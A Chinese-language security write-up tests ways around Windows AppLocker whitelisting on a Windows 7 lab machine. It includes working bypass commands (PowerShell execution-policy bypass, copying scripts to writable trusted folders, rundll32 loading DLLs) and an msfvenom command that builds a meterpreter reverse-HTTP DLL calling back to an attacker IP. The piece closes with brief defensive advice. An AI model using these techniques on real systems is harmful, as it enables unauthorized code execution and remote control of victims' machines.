# Bypass Windows AppLocker

0x00 前言
=======

* * *

![Alt text](http://drops.javaweb.org/uploads/images/6533dc0827bdcce348352850e186f7b6188cf17d.jpg)

上一次我们对McAfee Application Control做了测试，这次接着对另一款白名单工具Windows AppLocker进行测试，分享一下其中的攻防技术。

0x01 简介
=======

* * *

Windows AppLocker，即“应用程序控制策略”，可用来对可执行程序、安装程序和脚本进行控制，之前只能支持windows7 Enterprise、windows7 Ultimate和WindowsServer2008 R2，但是微软在2012年10月18日将其更新，已支持Windows8.1,Windows Server2012 R2,WindowsServer2012和Windows8 Enterprise

如图

![Alt text](http://drops.javaweb.org/uploads/images/6215de1af47e31ebc32178426636f94a12d0fcae.jpg)

AppLocker可对以下文件格式创建规则，限制其执行

![Alt text](http://drops.javaweb.org/uploads/images/2c7cb472424e81a580931286ffaab9136423889e.jpg)

下面我们就实际测试一下相关功能

0x02 配置
=======

* * *

**测试环境:**

```
OS：Windows7 Ultimate x86

```

### 1、开启服务

进入计算机管理-服务-Application Identity，将服务设置为开启

如图

![Alt text](http://drops.javaweb.org/uploads/images/d3f62a162d14710e26202f71ccbc759a8245fa36.jpg)

### 2、进入AppLocker配置界面

输入`secpol.msc`进入本地安全策略-应用程序控制策略-AppLocker

或者`gpedit.msc`-计算机配置-Windows设置-安全设置-应用程序控制策略-AppLocker

如图

![Alt text](http://drops.javaweb.org/uploads/images/a8485df23aa3804b589b04aa024bd2488057c3f2.jpg)

### 3、配置规则

对可执行文件设置默认规则：

*   允许本地管理员组的成员运行所有应用程序。
*   允许 Everyone 组的成员运行位于 Windows 文件夹中的应用程序。
*   允许 Everyone 组的成员运行位于 Program Files 文件夹中的应用程序。

如图

![Alt text](http://drops.javaweb.org/uploads/images/489e04da2ca26c819f73777e1ba691d45b612d37.jpg)

对脚本设置默认规则：

*   允许本地管理员组的成员运行所有脚本。
*   允许 Everyone 组的成员运行位于 Program Files 文件夹中的脚本。
*   允许 Everyone 组的成员运行位于 Windows 文件夹中的脚本。

如图

![Alt text](http://drops.javaweb.org/uploads/images/9ff59e7101d1fb07cbcaec03492f6672baf019ad.jpg)

**开启默认规则后，除了默认路径可以执行外，其他路径均无法执行程序和脚本**

0x03 测试
=======

* * *

### 1、执行exe

![Alt text](http://drops.javaweb.org/uploads/images/b2af227df1a8a8d98b7b8389a2db58e15e5f7a7b.jpg)

### 2、执行脚本

![Alt text](http://drops.javaweb.org/uploads/images/427c1745e5b2c07537cc6ce05048c79c0c4d91ae.jpg)

![Alt text](http://drops.javaweb.org/uploads/images/2ec64b0f0a997bfa00ede2e740792a1fd0a6a189.jpg)

0x04 安全机制分析
===========

* * *

通过测试发现设置的规则已经生效，能够阻止信任路径外的exe和脚本执行，但是对以下方面没有做限制：

1.  内存
2.  Office 宏
3.  HTML Applications，即hta文件
4.  powershell

而我们已经掌握的绕过技术有：

1.  利用hta文件
2.  利用jscript
3.  利用powershell
4.  利用InstallUtil
5.  利用regsvcs

再加上新学来的技巧，我们最终发现了如下可供利用的方法：）

0x05 绕过方法
=========

* * *

### 1、hta

成功

（可参照[http://drops.wooyun.org/tips/10667](http://drops.wooyun.org/tips/10667)）

可用来执行vbs和JavaScript脚本

### 2、提权

提权到管理员权限，即可执行突破AppLocker的限制，执行exe和脚本

### 3、powershell

**（1）可以执行ps脚本**

```
PowerShell.exe -ExecutionPolicy Bypass -File 

```

**（2）可以通过如下方式执行ps脚本**

```
Get-Content script.txt | iex

```

**（3）可以利用快捷方式执行Powershell**

成功

（可参照[http://drops.wooyun.org/tips/10667](http://drops.wooyun.org/tips/10667)）

### 4、进程注入

既然可以执行powershell脚本，那么就可以反弹出meterpreter

然后尝试进程注入

（可参照[http://drops.wooyun.org/tips/11305](http://drops.wooyun.org/tips/11305)）

如果注入到普通权限进程，无法执行exe和脚本

如果是system权限进程，可以执行exe和脚本

### 5、查找可利用的文件路径

通过ps脚本扫描可写入的路径

下载地址：[http://go.mssec.se/AppLockerBC](http://go.mssec.se/AppLockerBC)

（如果无法下载，我已将该脚本上传至Github）

测试如图

![Alt text](http://drops.javaweb.org/uploads/images/71b1e210735e18162c34155e36dbfd6ec4120bc3.jpg)

![Alt text](http://drops.javaweb.org/uploads/images/ec6ecceebe0f59e827d5af907815a5c9811aa734.jpg)

![Alt text](http://drops.javaweb.org/uploads/images/449b642254e0c1094fbbf9a7a6ac62b78e765fc1.jpg)

执行后会自动扫描出可利用的路径

比如选择路径：`c:\Windows\Tasks`

正常执行calc.js会被拦截

但是`copy calc.js c:\Windows\Tasks`后

再执行`c:\Windows\Tasks\calc.js`，可以绕过拦截

如图

![Alt text](http://drops.javaweb.org/uploads/images/35d6296b0ddf6007733f0e782176b5925eaccb6a.jpg)

### 6、rundll32

**（1）执行JavaScript**

**a、**直接弹回一个Http shell

（可参照[http://drops.wooyun.org/tips/11764](http://drops.wooyun.org/tips/11764)）

但无法绕过对执行exe和脚本的拦截

**b、**利用JavaScript执行powershell命令返回HTTP shell

![Alt text](http://drops.javaweb.org/uploads/images/c3d6bba2b9c9c8da30810d71b5514dce17819f0d.jpg)

**（2）加载第三方dll**

**a、**自己编写的dll

参考资料：  
[http://blog.didierstevens.com/2010/02/04/cmd-dll/](http://blog.didierstevens.com/2010/02/04/cmd-dll/)

按照dll的格式，自己编写并生成dll上传

执行

```
rundll32.exe cmd.dll,Control_RunDLL

```

弹出一个cmd

如图

![Alt text](http://drops.javaweb.org/uploads/images/68f48814d41d35f72980780173cbdf85c60452e3.jpg)

**b、**反弹meterpreter

kali下：

```
msfvenom -p windows/meterpreter/reverse_http -f dll LHOST=192.168.174.133 LPORT=8080>./a.dll

```

生成a.dll,然后上传至测试主机

执行

```
rundll32.exe a.dll,Control_RunDLL

```

即可上线

如图

![Alt text](http://drops.javaweb.org/uploads/images/c43179463897b20d774088c39d30e510ab52327f.jpg)

![Alt text](http://drops.javaweb.org/uploads/images/58897e15e1ca55e685ac55258eb227080cf0a415.jpg)

### 7、利用InstallUtil

利用InstallUtil.exe直接执行shellcode 成功

如果有Microsoft .NET Framework 4.0环境，可用来执行exe

（可参照[http://drops.wooyun.org/tips/8701](http://drops.wooyun.org/tips/8701),[http://drops.wooyun.org/tips/8862](http://drops.wooyun.org/tips/8862)）

### 8、利用regsvcs

成功

（可参照[http://drops.wooyun.org/tips/10667](http://drops.wooyun.org/tips/10667)）

0x06 防御
=======

* * *

1.  严格控制文件写入权限
2.  禁用mshta.exe阻止hta的运行
3.  禁用powershell
4.  防止被提权

0x07 小结
=======

* * *

随着研究的逐渐深入，我们不难发现：利用InstallUtil、regsvcs是绕过白名单限制的一把利器，无论是攻击还是防御，对此部分都要尤其重视。

而利用rundll32.exe的技巧，正在慢慢被发掘。

0x08 参考资料：
==========

* * *

*   [https://technet.microsoft.com/en-us/library/dd759117.aspx](https://technet.microsoft.com/en-us/library/dd759117.aspx)
*   [https://technet.microsoft.com/en-us/library/hh831440.aspx](https://technet.microsoft.com/en-us/library/hh831440.aspx)
*   [http://dfir-blog.com/2016/01/03/protecting-windows-networks-applocker/](http://dfir-blog.com/2016/01/03/protecting-windows-networks-applocker/)
*   [https://mssec.wordpress.com/2015/10/22/applocker-bypass-checker/](https://mssec.wordpress.com/2015/10/22/applocker-bypass-checker/)
*   [https://www.attackdebris.com/?p=143](https://www.attackdebris.com/?p=143)
*   [http://blog.didierstevens.com/2010/02/04/cmd-dll/](http://blog.didierstevens.com/2010/02/04/cmd-dll/)

相关文件下载地址：

[https://github.com/3gstudent/Bypass-Windows-AppLocker](https://github.com/3gstudent/Bypass-Windows-AppLocker)

**本文由三好学生原创并首发于乌云drops，转载请注明**